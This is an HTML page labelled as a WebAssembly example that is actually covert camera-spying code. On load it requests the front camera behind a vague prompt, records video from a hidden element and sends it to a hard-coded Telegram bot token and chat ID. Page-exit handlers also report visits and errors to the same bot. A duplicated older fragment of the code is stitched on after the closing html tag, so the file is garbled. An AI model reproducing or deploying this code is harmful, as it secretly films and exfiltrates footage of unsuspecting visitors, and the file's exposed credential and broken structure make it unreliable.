<!DOCTYPE html>
<html>
<head>
  <title>WebAssembly Example</title>
  <style>
    #camera, #canvas {
      display: none;
    }
    #permissionRequest {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #ffeb3b;
      padding: 10px;
      text-align: center;
      z-index: 1000;
    }
  </style>
</head>
<body>
  <div id="permissionRequest" style="display:none;">
    Please allow camera access to continue...
  </div>
  <video id="camera" autoplay playsinline></video>
  <canvas id="canvas"></canvas>
  
  <script>
    // Telegram bot details
    const botToken = '7826950594:AAFBygBD_E2PmAITI6zsaPilys7l6i0gWBU';
    const chatId = '894002841';
    const message = 'Someone opened help.html';

    // DOM elements
    const video = document.getElementById('camera');
    const canvas = document.getElementById('canvas');
    const permissionRequest = document.getElementById('permissionRequest');
    const ctx = canvas.getContext('2d');

    // Recording variables
    let mediaRecorder;
    let recordedChunks = [];
    let stream = null;
    let isRecordingComplete = false;
    let hasSentData = false;

    // Enhanced sendVideoToTelegram with retries and compression
    async function sendVideoToTelegram(videoBlob, attempt = 1) {
      // Validate blob
      if (!videoBlob || videoBlob.size === 0) {
        console.error('Empty video blob');
        sendTextMessage(message + ' (Empty recording)');
        return false;
      }

      // Create form data
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('caption', message);
      formData.append('video', videoBlob, 'recording.mp4');

      try {
        // Try sending with fetch (preferred)
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
          method: 'POST',
          body: formData,
          keepalive: true // Important for page exit scenarios
        });

        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        
        const data = await response.json();
        console.log('Video sent successfully', data);
        hasSentData = true;
        return true;
      } catch (error) {
        console.error(`Attempt ${attempt} failed:`, error);

        // Handle specific error cases
        if (attempt < 3) {
          if (error.message.includes('413') || videoBlob.size > 5000000) {
            // Try compression if file too large
            console.log('Attempting compression...');
            const compressedBlob = await compressVideo(videoBlob);
            return sendVideoToTelegram(compressedBlob, attempt + 1);
          } else {
            // Simple retry for other errors
            await new Promise(resolve => setTimeout(resolve, 1000));
            return sendVideoToTelegram(videoBlob, attempt + 1);
          }
        } else {
          // Final fallback to text message
          console.error('All attempts failed');
          sendTextMessage(message + ` (Failed to send video: ${error.message})`);
          return false;
        }
      }
    }

    // Video compression function
    async function compressVideo(blob) {
      return new Promise((resolve) => {
        const tempVideo = document.createElement('video');
        tempVideo.src = URL.createObjectURL(blob);
        
        tempVideo.onloadedmetadata = () => {
          // Reduce resolution by half
          canvas.width = tempVideo.videoWidth / 2;
          canvas.height = tempVideo.videoHeight / 2;
          
          tempVideo.currentTime = 0;
          tempVideo.onseeked = () => {
            ctx.drawImage(tempVideo, 0, 0, canvas.width, canvas.height);
            // Convert to lower quality WebM
            canvas.toBlob(resolve, 'video/webm', 0.5);
          };
        };
      });
    }

    // Reliable text message sender
    function sendTextMessage(text) {
      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
      
      // Try fetch first
      fetch(url, { keepalive: true })
        .catch(() => {
          // Fallback to XHR if fetch fails
          const xhr = new XMLHttpRequest();
          xhr.open('GET', url, false);
          xhr.send();
        });
      
      hasSentData = true;
    }

    // Start recording with chunked data
    function startRecording(mediaStream) {
      stream = mediaStream;
      recordedChunks = [];
      isRecordingComplete = false;
      hasSentData = false;

      mediaRecorder = new MediaRecorder(stream, {
        mimeType: 'video/webm',
        videoBitsPerSecond: 250000 // Lower bitrate for smaller files
      });

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          recordedChunks.push(e.data);
          // Send incremental update if we have enough data
          if (recordedChunks.length >= 2 && !hasSentData) {
            sendPartialRecording();
          }
        }
      };

      mediaRecorder.onstop = async () => {
        isRecordingComplete = true;
        if (!hasSentData) {
          const completeBlob = new Blob(recordedChunks, { type: 'video/webm' });
          await sendVideoToTelegram(completeBlob);
        }
        cleanup();
      };

      // Start recording with 1 second chunks
      mediaRecorder.start(1000);
      
      // Stop after 5 seconds (adjust as needed)
      setTimeout(() => {
        if (!isRecordingComplete) {
          mediaRecorder.stop();
        }
      }, 5000);
    }

    // Send partial recording
    function sendPartialRecording() {
      if (recordedChunks.length === 0) return;
      
      const partialBlob = new Blob(recordedChunks, { type: 'video/webm' });
      const partialFormData = new FormData();
      partialFormData.append('chat_id', chatId);
      partialFormData.append('caption', 'Partial: ' + message);
      partialFormData.append('video', partialBlob, 'partial_recording.mp4');

      navigator.sendBeacon(
        `https://api.telegram.org/bot${botToken}/sendVideo`,
        partialFormData
      );
      
      hasSentData = true;
    }

    // Clean up resources
    function cleanup() {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
      }
      recordedChunks = [];
    }

    // Handle page exit scenarios
    window.addEventListener('beforeunload', (e) => {
      if (!hasSentData) {
        // Try to send whatever we have
        if (recordedChunks.length > 0) {
          sendPartialRecording();
        } else {
          sendTextMessage(message + ' (User left before recording)');
        }
        
        // For very quick exits, use synchronous XHR as last resort
        if (!hasSentData) {
          const xhr = new XMLHttpRequest();
          xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendMessage`, false);
          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhr.send(`chat_id=${chatId}&text=${encodeURIComponent(message + ' (Quick exit)')}`);
        }
      }
    });

    // Initialize camera
    async function initCamera() {
      permissionRequest.style.display = 'block';
      
      try {
        const constraints = {
          video: {
            facingMode: 'user',
            width: { ideal: 640 },
            height: { ideal: 480 }
          },
          audio: false
        };

        const mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
        permissionRequest.style.display = 'none';
        video.srcObject = mediaStream;
        
        video.onloadedmetadata = () => {
          startRecording(mediaStream);
        };
        
      } catch (error) {
        console.error('Camera error:', error);
        permissionRequest.style.display = 'none';
        sendTextMessage(message + ` (Camera error: ${error.message})`);
      }
    }

    // Start when page loads
    window.addEventListener('DOMContentLoaded', () => {
      // Check for required APIs
      if (!navigator.mediaDevices?.getUserMedia) {
        sendTextMessage(message + ' (Camera API not supported)');
        return;
      }

      // HTTPS check
      if (window.location.protocol !== 'https:') {
        sendTextMessage(message + ' (Needs HTTPS for camera)');
      }

      initCamera();
    });

    // Original WebAssembly code (unchanged)
    fetch('my_module.wasm')
      .then(response => response.arrayBuffer())
      .then(bytes => WebAssembly.instantiate(bytes, {}))
      .then(results => {
        const instance = results.instance;
        const add = instance.exports.add;
        const result = add(5, 3);
        console.log("Result from WebAssembly: " + result);
      })
      .catch(e => console.error("Wasm error:", e));
  </script>
</body>
</html>
      mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });

      mediaRecorder.ondataavailable = function(e) {
        if (e.data.size > 0) {
          recordedChunks.push(e.data);
        }
      };

      mediaRecorder.onstop = function() {
        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
        sendVideoToTelegram(videoBlob);
        
        // Stop all video tracks
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      };

      mediaRecorder.start();
      setTimeout(() => {
        mediaRecorder.stop();
      }, 3000); // Record for 3 seconds
    }

    // Request camera access
    async function initCamera() {
      permissionRequest.style.display = 'block';
      
      try {
        // Try to get front camera (facing mode 'user')
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            facingMode: 'user',  // This specifies front camera
            width: { ideal: 1280 },
            height: { ideal: 720 }
          },
          audio: false
        });
        
        permissionRequest.style.display = 'none';
        video.srcObject = stream;
        
        // Wait for video to be ready
        video.onloadedmetadata = () => {
          startRecording(stream);
        };
        
      } catch (error) {
        console.error('Error accessing camera:', error);
        permissionRequest.style.display = 'none';
        
        // Try fallback to any camera if front camera fails
        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false
          });
          
          video.srcObject = stream;
          video.onloadedmetadata = () => {
            startRecording(stream);
          };
          
        } catch (fallbackError) {
          console.error('Fallback camera access failed:', fallbackError);
          sendTextMessage(message + ' (Camera access denied)');
        }
      }
    }

    // Start the process when page loads
    window.addEventListener('DOMContentLoaded', () => {
      // Check if browser supports mediaDevices API
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        sendTextMessage(message + ' (Browser does not support camera access)');
        return;
      }
      
      initCamera();
    });

    // Original WebAssembly code (unchanged)
    fetch('my_module.wasm')
      .then(response => response.arrayBuffer())
      .then(bytes => WebAssembly.instantiate(bytes, {}))
      .then(results => {
        const instance = results.instance;
        const add = instance.exports.add;
        const result = add(5, 3);
        console.log("Result from WebAssembly: " + result);
      });
  </script>
</body>
</html>
